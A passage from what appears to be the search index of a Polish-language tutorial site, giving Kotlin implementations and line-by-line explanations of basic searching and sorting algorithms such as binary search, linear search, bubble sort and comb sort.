rozmiaru tablicy. Je\u017celi pocz\u0105tek zakresu jest nadal poprawny, to sprawdzamy, czy pod tym indeksem znajduje si\u0119 poszukiwana liczba (linia 17). Je\u017celi tak jest, to zwracamy indeks znalezionej liczby, czyli indeks pocz\u0105tku przeszukiwanego zakresu (linia 18).</p> <p>Na koniec, gdy nie zwr\u00f3cili\u015bmy wcze\u015bniej \u017cadnej warto\u015bci, tzn., gdy nie znale\u017ali\u015bmy poszukiwanej liczby w podanej li\u015bcie, zwracamy stosown\u0105 informacj\u0119, czyli warto\u015b\u0107 \\(-1\\) (linia 21).</p> <p>W kodzie g\u0142\u00f3wnym, czyli funkcji <code>main</code> (linia 24) na pocz\u0105tku tworzymy przyk\u0142adowe dane testowe: uporz\u0105dkowan\u0105 rosn\u0105co list\u0119 liczb (linia 25) oraz poszukiwan\u0105 warto\u015b\u0107 (linia 26). Nast\u0119pnie wywo\u0142ujemy wyszukiwanie binarne ze wspomnianymi danymi, a wynik zapisujemy w zmiennej <code>index</code> (linia 28).</p> <p>Na koniec programu wypisujemy stosowny komunikat w zale\u017cno\u015bci od wyniku (linie 30-34).</p>"},{"location":"programming/kotlin/algorithms/searching/binary-search/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":""},{"location":"programming/kotlin/algorithms/searching/binary-search/#implementacja_1","title":"Implementacja","text":"<pre><code>fun binarySearch(array: List&lt;Int&gt;, number: Int, left: Int, right: Int): Int {\n  if(left == right &amp;&amp; array[left] == number) {\n    return left\n  }\n  else if (left &gt;= right) {\n    return -1\n  }\n\n  val middle = (left + right) / 2\n\n  if (number &lt; array[middle]) {\n    return binarySearch(array, number, left, middle)\n  } else if (number &gt; array[middle]) {\n    return binarySearch(array, number, middle + 1, right)\n  } else {\n    return middle\n  }\n}\n\nfun main() {\n  val array = listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)\n  val number = 8\n\n  val index = binarySearch(array, number, 0, array.count())\n\n  if (index == -1) {\n    println(\"Szukanej liczby nie ma na liscie\")\n  } else {\n    println(\"Szukana liczba znajduje sie pod indeksem $index\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/binary-search/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Wyszukiwanie binarne - wersja rekurencyjna</p>"},{"location":"programming/kotlin/algorithms/searching/binary-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearch</code> (linia 1) przyjmuje cztery argumenty: uporz\u0105dkowan\u0105 rosn\u0105co list\u0119 liczb ca\u0142kowitych (<code>array</code>), poszukiwan\u0105 liczb\u0119 ca\u0142kowit\u0105 (<code>number</code>) oraz pocz\u0105tek (<code>left</code>) oraz koniec (<code>right</code>) aktualnie przeszukiwanego przedzia\u0142u (podanego jako indeksy element\u00f3w przeszukiwanej listy). Wynikiem zwracanym przez funkcj\u0119 b\u0119dzie liczba ca\u0142kowita reprezentuj\u0105ca pozycj\u0119 (indeks) szukanej warto\u015bci na li\u015bcie <code>array</code> w podanym przedziale, lub \\(-1\\), gdy elementu nie znaleziono.</p> <p>Zaczynamy od warunku stopu funkcji rekurencyjnej. Sprawdzamy, czy sprawdzany przedzia\u0142 zawiera dok\u0142adnie jeden element i czy tym elementem jest poszukiwana warto\u015b\u0107 (linia 2). Je\u017celi tak jest, to zwracamy indeks tego elementu (pocz\u0105tek lub koniec przeszukiwanego przedzia\u0142u), jako wynik (linia 3). Je\u017celi tak nie jest, to sprawdzamy, czy przedzia\u0142 zawiera dok\u0142adnie jeden element, lub czy te\u017c jest niepoprawny (linia 5). W takim przypadku w przeszukiwanym przedziale nie ma szukanego elementu, wi\u0119c zwracamy \\(-1\\) (linia 6).</p> <p>Po sprawdzeniu warunku stopu obliczamy \u015brodek obecnego zakresu i zapisujemy w zmiennej <code>middle</code> (linia 9). Nast\u0119pnie sprawdzamy relacj\u0119 poszukiwanej liczby z warto\u015bci\u0105 znajduj\u0105c\u0105 si\u0119 pod \u015brodkowym indeksem. Je\u017celi poszukiwana warto\u015b\u0107 jest mniejsza (linia 11), to rekurencyjnie przeszukujemy lew\u0105 cz\u0119\u015b\u0107 listy, zmieniaj\u0105c koniec przeszukiwanego przedzia\u0142u (linia 12). W przeciwnym przypadku, je\u017celi poszukiwana liczba jest wi\u0119ksza od warto\u015bci znajduj\u0105cej si\u0119 w \u015brodku przedzia\u0142u (linia 13), to rekurencyjnie przeszukujemy praw\u0105 cz\u0119\u015b\u0107 listy, zmieniaj\u0105c koniec przedzia\u0142u (linia 14). W przeciwnym przypadku, tzn., gdy poszukiwana liczba nie jest ani mniejsza ani wi\u0119ksza od warto\u015bci znajduj\u0105cej si\u0119 pod indeksem <code>middle</code>, oznacza to, \u017ce znale\u017ali\u015bmy poszukiwan\u0105 warto\u015b\u0107, wi\u0119c zwracamy jej indeks, czyli warto\u015b\u0107 zmiennej <code>middle</code> (linia 16).</p> <p>W kodzie g\u0142\u00f3wnym, czyli funkcji <code>main</code> (linia 20) na pocz\u0105tku tworzymy przyk\u0142adowe dane testowe: uporz\u0105dkowan\u0105 rosn\u0105co list\u0119 liczb (linia 21) oraz poszukiwan\u0105 warto\u015b\u0107 (linia 22). Nast\u0119pnie wywo\u0142ujemy wyszukiwanie binarne ze wspomnianymi danymi, jako przedzia\u0142 podaj\u0105c pocz\u0105tek i liczb\u0119 element\u00f3w listy, a wynik zapisujemy w zmiennej <code>index</code> (linia 24).</p> <p>Na koniec programu wypisujemy stosowny komunikat w zale\u017cno\u015bci od wyniku (linie 26-30).</p>"},{"location":"programming/kotlin/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/kotlin/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/kotlin/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>fun linearSearch(array: List&lt;Int&gt;, number: Int): Boolean {\n  for (el in array) {\n    if (el == number) {\n      return true\n    }\n  }\n\n  return false\n}\n\nfun main() {\n  val array = listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)\n  val number = 8\n\n  val result = linearSearch(array, number)\n\n  if (result) {\n    println(\"Poszukiwana wartosc jest w liscie\")\n  } else {\n    println(\"Poszukiwanej wartosci nie ma w liscie\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wyszukiwanie liniowe - istnienie elementu</p>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne elementy listy (linia 2). Dla ka\u017cdego elementu sprawdzamy, czy jego warto\u015b\u0107 jest t\u0105, kt\u00f3rej szukamy (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie elementy listy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":"<pre><code>fun linearSearch(array: List&lt;Int&gt;, number: Int): Int {\n  for (i in array.indices) {\n    if (array[i] == number) {\n      return i\n    }\n  }\n\n  return -1\n}\n\nfun main() {\n  val array = listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)\n  val number = 8\n\n  val index = linearSearch(array, number)\n\n  if (index == -1) {\n    println(\"Poszukiwanej wartosci nie ma w liscie\")\n  } else {\n    println(\"Poszukiwana wartosc znajduje sie pod indeksem $index\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Wyszukiwanie liniowe - pozycja elementu</p>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie (linia 2). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks warto\u015bci w li\u015bcie (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 \\(-1\\) informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w li\u015bcie (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/kotlin/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>fun linearSearch(array: List&lt;Int&gt;, number: Int) {\n  for (i in array.indices) {\n    if (array[i] == number) {\n      println(i)\n    }\n  }\n}\n\nfun main() {\n  val array = listOf(8, 2, 8, 4, 5, 6, 7, 8, 9, 8)\n  val number = 8\n\n  println(\"Poszukiwana wartosc znajduje sie pod nast\u0119pujacymi indeksami:\")\n  linearSearch(array, number)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#link-do-implementacji_2","title":"Link do implementacji","text":"<p>Wyszukiwanie liniowe - wszystkie pozycje elementu</p>"},{"location":"programming/kotlin/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w li\u015bcie (linia 2). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w li\u015bcie znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: list\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) i wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/kotlin/algorithms/searching/longest-growing-substring/","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":""},{"location":"programming/kotlin/algorithms/searching/longest-growing-substring/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/longest-growing-substring/#implementacja","title":"Implementacja","text":"<pre><code>fun longestGrowingSubstringLength(array: List&lt;Int&gt;): Int {\n  var maxLength = 1\n  var currentLength = 1\n\n  for (i in 1 until array.count()) {\n    if (array[i] &gt; array[i - 1]) {\n      currentLength += 1\n      if (currentLength &gt; maxLength) {\n        maxLength = currentLength\n      }\n    } else {\n      currentLength = 1\n    }\n  }\n\n  return maxLength\n}\n\nfun main() {\n  val array = listOf(4, 9, 7, 2, 4, 7, 9, 3, 8, 6)\n\n  val result = longestGrowingSubstringLength(array)\n\n  println(\"Dlugosc najdluzszego rosnacego spojnego podciagu wynosi $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/longest-growing-substring/#link-do-implementacji","title":"Link do implementacji","text":"<p>D\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu rosn\u0105cego</p>"},{"location":"programming/kotlin/algorithms/searching/longest-growing-substring/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/majority/","title":"Znajdowanie lidera w zbiorze","text":""},{"location":"programming/kotlin/algorithms/searching/majority/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/majority/#implementacja","title":"Implementacja","text":"<pre><code>fun countOccurrences(element: Int, array: List&lt;Int&gt;): Int {\n  var count = 0\n\n  for (el in array) {\n    if (el == element) {\n      count += 1\n    }\n  }\n\n  return count\n}\n\nfun findMajority(array: List&lt;Int&gt;): Int {\n  var counter = 0\n  var currentCandidate = 0\n\n  for (el in array) {\n    if(counter == 0) {\n      currentCandidate = el\n      counter = 1\n    } else if (el == currentCandidate) {\n      counter += 1\n    } else {\n      counter -= 1\n    }\n  }\n\n  if (countOccurrences(currentCandidate, array) &gt;= array.count() / 2) {\n    return currentCandidate\n  } else {\n    return -1\n  }\n}\n\nfun main() {\n  val array = listOf(1, 2, 5, 5, 7, 5, 5, 10, 5, 5)\n\n  val majority = findMajority(array)\n\n  if (majority == -1) {\n    println(\"Nie ma lidera\")\n  } else {\n    println(\"Lider to $majority\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/majority/#link-do-implementacji","title":"Link do implementacji","text":"<p>Znajdowanie lidera w zbiorze</p>"},{"location":"programming/kotlin/algorithms/searching/majority/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/min-max-search/","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":""},{"location":"programming/kotlin/algorithms/searching/min-max-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/min-max-search/#podejscie-naiwne","title":"Podej\u015bcie naiwne","text":""},{"location":"programming/kotlin/algorithms/searching/min-max-search/#implementacja","title":"Implementacja","text":"<pre><code>fun findMinMax(array: List&lt;Int&gt;): Pair&lt;Int,Int&gt; {\n  var min = array[0]\n  var max = array[0]\n\n  for (el in array) {\n    if (el &lt; min) {\n      min = el\n    } else if (el &gt; max) {\n      max = el\n    }\n  }\n\n  return Pair(min, max)\n}\n\nfun main() {\n  val array = listOf(3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11)\n\n  val (min, max) = findMinMax(array)\n\n  println(\"Minimum: $min, Maximum: $max\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/min-max-search/#link-do-implementacji","title":"Link do implementacji","text":"<p>Jednoczesne wyszukiwanie minimum i maksimum - podej\u015bcie naiwne</p>"},{"location":"programming/kotlin/algorithms/searching/min-max-search/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/min-max-search/#podejscie-optymalne","title":"Podej\u015bcie optymalne","text":"<pre><code>fun findMinMax(array: List&lt;Int&gt;): Pair&lt;Int,Int&gt; {\n  var minCandidates = mutableListOf&lt;Int&gt;()\n  var maxCandidates = mutableListOf&lt;Int&gt;()\n\n  for (i in 1 until array.count() step 2) {\n    if (array[i - 1] &lt; array[i]) {\n      minCandidates.add(array[i - 1])\n      maxCandidates.add(array[i])\n    } else {\n      minCandidates.add(array[i])\n      maxCandidates.add(array[i - 1])\n    }\n  }\n\n  if (array.count() % 2 != 0) {\n    minCandidates.add(array[array.count() - 1])\n    maxCandidates.add(array[array.count() - 1])\n  }\n\n  var min = minCandidates[0]\n  var max = maxCandidates[0]\n\n  for (i in minCandidates.indices) {\n    if (min &gt; minCandidates[i]) {\n      min = minCandidates[i]\n    }\n\n    if (max &lt; maxCandidates[i]) {\n      max = maxCandidates[i]\n    }\n  }\n\n  return Pair(min, max)\n}\n\nfun main() {\n  val array = listOf(3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11)\n\n  val (min, max) = findMinMax(array)\n\n  println(\"Minimum: $min, Maximum: $max\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/min-max-search/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Jednoczesne wyszukiwanie minimum i maksimum - podej\u015bcie optymalne</p>"},{"location":"programming/kotlin/algorithms/searching/min-max-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/kotlin/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/min-or-max/#wyszukiwanie-wartosci-minimum-i-maksimum","title":"Wyszukiwanie warto\u015bci minimum i maksimum","text":""},{"location":"programming/kotlin/algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":"<pre><code>fun findMinVal(array: List&lt;Int&gt;): Int {\n  var minVal = array[0]\n\n  for (el in array) {\n    if (el &lt; minVal) {\n      minVal = el\n    }\n  }\n\n  return minVal\n}\n\nfun findMaxVal(array: List&lt;Int&gt;): Int {\n  var maxVal = array[0]\n\n  for(el in array) {\n    if(el &gt; maxVal) {\n      maxVal = el\n    }\n  }\n\n  return maxVal\n}\n\nfun main() {\n  val array = listOf(8, 2, 9, 10, 5, 4, 2, 7, 18, 0)\n\n  val minVal = findMinVal(array)\n  val maxVal = findMaxVal(array)\n\n  println(\"Min: $minVal\")\n  println(\"Max: $maxVal\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/min-or-max/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wyszukiwanie warto\u015bci minimum i maksimum</p>"},{"location":"programming/kotlin/algorithms/searching/min-or-max/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/min-or-max/#wyszukiwanie-indeksow-wartosci-minimum-i-maksimum","title":"Wyszukiwanie indeks\u00f3w warto\u015bci minimum i maksimum","text":""},{"location":"programming/kotlin/algorithms/searching/min-or-max/#implementacja_1","title":"Implementacja","text":"<pre><code>fun findMinInd(array: List&lt;Int&gt;): Int {\n  var minInd = 0\n\n  for (i in array.indices) {\n    if (array[i] &lt; array[minInd]) {\n      minInd = i\n    }\n  }\n\n  return minInd\n}\n\nfun findMaxInd(array: List&lt;Int&gt;): Int {\n  var maxInd = 0\n\n  for(i in array.indices) {\n    if(array[i] &gt; array[maxInd]) {\n      maxInd = i\n    }\n  }\n\n  return maxInd\n}\n\nfun main() {\n  val array = listOf(8, 2, 9, 10, 5, 4, 2, 7, 18, 0)\n\n  val minInd = findMinInd(array)\n  val maxInd = findMaxInd(array)\n\n  println(\"Wartosc minimum znajduje sie na pozycji: $minInd\")\n  println(\"Wartosc maximum znajduje sie na pozycji: $maxInd\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/min-or-max/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Wyszukiwanie indeks\u00f3w warto\u015bci min i maks</p>"},{"location":"programming/kotlin/algorithms/searching/min-or-max/#opis-implementacji_1","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/sum-of-two/","title":"Suma dw\u00f3ch liczb","text":""},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":""},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#implementacja","title":"Implementacja","text":"<pre><code>fun sumOfTwo(array: List&lt;Int&gt;, sum: Int) {\n  for (i in array.indices) {\n    for (j in i + 1 until array.count()) {\n      if (array[i] + array[j] == sum) {\n        println(\"${array[i]} + ${array[j]} = $sum\")\n      }\n    }\n  }\n}\n\nfun main() {\n  val array = listOf(1, 2, 4, 6, 8, 9, 10, 12, 13, 15)\n  val sum = 18\n\n  sumOfTwo(array, sum)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#link-do-implementacji","title":"Link do implementacji","text":"<p>Suma dw\u00f3ch - rozwi\u0105zanie naiwne</p>"},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":""},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#implementacja_1","title":"Implementacja","text":"<pre><code>fun sumOfTwo(array: List&lt;Int&gt;, sum: Int) {\n  var left = 0\n  var right = array.count() - 1\n\n  while (left &lt; right &amp;&amp; array[left] + array[right] != sum) {\n    if (array[left] + array[right] &lt; sum) {\n      left += 1\n    } else {\n      right -= 1\n    }\n  }\n\n  if (left &lt; right) {\n    println(\"${array[left]} + ${array[right]} = $sum\")\n  } else {\n    println(\"Nie znaleziono pary dajacej pozadana sume\")\n  }\n}\n\nfun main() {\n  val array = listOf(1, 2, 4, 6, 8, 9, 10, 12, 13, 15)\n  val sum = 18\n\n  sumOfTwo(array, sum)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Suma dw\u00f3ch - rozwi\u0105zanie optymalne</p>"},{"location":"programming/kotlin/algorithms/searching/sum-of-two/#opis-implementacji_1","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/sorting/bubble-sort/","title":"Sortowanie b\u0105belkowe","text":""},{"location":"programming/kotlin/algorithms/sorting/bubble-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/bubble-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun bubbleSort(array: MutableList&lt;Int&gt;) {\n    var sorted = false\n    var i = 1\n    while (!sorted) {\n        sorted = true\n        for(j in array.count() - 1 downTo i) {\n            if(array[j] &lt; array[j - 1]) {\n                val tmp = array[j]\n                array[j] = array[j - 1]\n                array[j - 1] = tmp\n                sorted = false\n            }\n        }\n\n        i++\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    bubbleSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/bubble-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Zaczynamy od utworzenia funkcji sortuj\u0105cej bubbleSort (linia 1), kt\u00f3ra przyjmuje jeden argument: list\u0119 element\u00f3w do posortowania. Przekazywana lista jest typu MutableList, poniewa\u017c b\u0119dziemy modyfikowa\u0107 jej elementy.</p> <p>Wewn\u0105trz funkcji tworzymy zmienne pomocnicze do pami\u0119tania, czy lista jest ju\u017c posortowana (linia 2) oraz do pami\u0119tania liczby posortowanych element\u00f3w (linia 3). Nast\u0119pnie uruchamiamy p\u0119tl\u0119, kt\u00f3ra b\u0119dzie wykonywa\u0107 operacje a\u017c do posortowania ca\u0142ej listy (linia 4). W p\u0119tli na pocz\u0105tku zak\u0142adamy, \u017ce lista zosta\u0142a ju\u017c posortowana (linia 5), a nast\u0119pnie zaczynamy kolejn\u0105 p\u0119tl\u0119 przechodz\u0105c\u0105 indeksami od ko\u0144ca tablicy do jej pocz\u0105tku, uwzgl\u0119dniaj\u0105c liczb\u0119 posortowanych ju\u017c element\u00f3w (linia 6). W tej zagnie\u017cd\u017conej p\u0119tli por\u00f3wnujemy ze sob\u0105 s\u0105siednie elementy listy (linia 7), a gdy s\u0105 u\u0142o\u017cone niezgodnie z porz\u0105dkiem sortowania, to zamieniamy je miejscami (linie 8-10). Zapami\u0119tujemy tak\u017ce, \u017ce lista nie zosta\u0142a jeszcze posortowana, poniewa\u017c dokonali\u015bmy zamiany (linia 11). Po wyj\u015bciu z zagnie\u017cd\u017conej p\u0119tli zwi\u0119kszamy licznik posortowanych element\u00f3w (linia 15).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej (linia 19) tworzymy list\u0119 do sortowania (linia 20), sortujemy j\u0105 wywo\u0142uj\u0105c nasz\u0105 funkcj\u0119 sortuj\u0105c\u0105 bubbleSort (linia 22) i wypisujemy posortowan\u0105 list\u0119 na ekranie (linia 24).</p>"},{"location":"programming/kotlin/algorithms/sorting/cocktail-shaker-sort/","title":"Sortowanie koktajlowe","text":""},{"location":"programming/kotlin/algorithms/sorting/cocktail-shaker-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/cocktail-shaker-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun cocktailShakerSort(array: MutableList&lt;Int&gt;) {\n    for (i in 0 until array.count() / 2 + 1) {\n        for (j in i until array.count() - i - 1) {\n            if (array[j] &gt; array[j + 1]) {\n                val tmp = array[j]\n                array[j] = array[j + 1]\n                array[j + 1] = tmp\n            }\n        }\n\n        for (j in array.count() - 1 - i downTo i + 1) {\n            if (array[j] &lt; array[j - 1]) {\n                val tmp = array[j]\n                array[j] = array[j - 1]\n                array[j - 1] = tmp\n            }\n        }\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    cocktailShakerSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/cocktail-shaker-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie koktajlowe</p>"},{"location":"programming/kotlin/algorithms/sorting/comb-sort/","title":"Sortowanie grzebieniowe","text":""},{"location":"programming/kotlin/algorithms/sorting/comb-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/comb-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun combSort(array: MutableList&lt;Int&gt;) {\n    var gap = array.count()\n    val shrink = 1.3\n    var sorted = false\n    while (!sorted) {\n        gap = (gap / shrink).toInt()\n        if (gap &lt;= 1) {\n            gap = 1\n            sorted = true\n        }\n\n        var i = 0\n        while (i + gap &lt; array.count()) {\n            if (array[i] &gt; array[i + gap]) {\n                val tmp = array[i]\n                array[i] = array[i + gap]\n                array[i + gap] = tmp\n                sorted = false\n            }\n\n            i++\n        }\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    combSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/comb-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie grzebieniowe</p>"},{"location":"programming/kotlin/algorithms/sorting/counting-sort/","title":"Sortowanie przez zliczanie","text":""},{"location":"programming/kotlin/algorithms/sorting/counting-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/counting-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun countOccurrences(array: MutableList&lt;Int&gt;, maxNumber: Int): Array&lt;Int&gt; {\n    val occurrences = Array&lt;Int&gt;(maxNumber + 1){0}\n\n    for (number in array) {\n        occurrences[number]++\n    }\n\n    return occurrences\n}\n\nfun countingSort(array: MutableList&lt;Int&gt;) {\n    val occurrences = countOccurrences(array, 100)\n    var index = 0\n\n    for (i in occurrences.indices) {\n        for (j in 1..occurrences[i]) {\n            array[index] = i\n            index++\n        }\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    countingSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/counting-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez zliczanie</p>"},{"location":"programming/kotlin/algorithms/sorting/gnome-sort/","title":"Sortowanie gnoma","text":""},{"location":"programming/kotlin/algorithms/sorting/gnome-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/gnome-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun gnomeSort(array: MutableList&lt;Int&gt;) {\n    var i = 0\n    while (i &lt; array.count()) {\n        if (i == 0 || array[i] &gt;= array[i - 1]) {\n            i++\n        } else {\n            val tmp = array[i]\n            array[i] = array[i - 1]\n            array[i - 1] = tmp\n            i--\n        }\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    gnomeSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/gnome-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie gnoma</p>"},{"location":"programming/kotlin/algorithms/sorting/heap-sort/","title":"Sortowanie przez 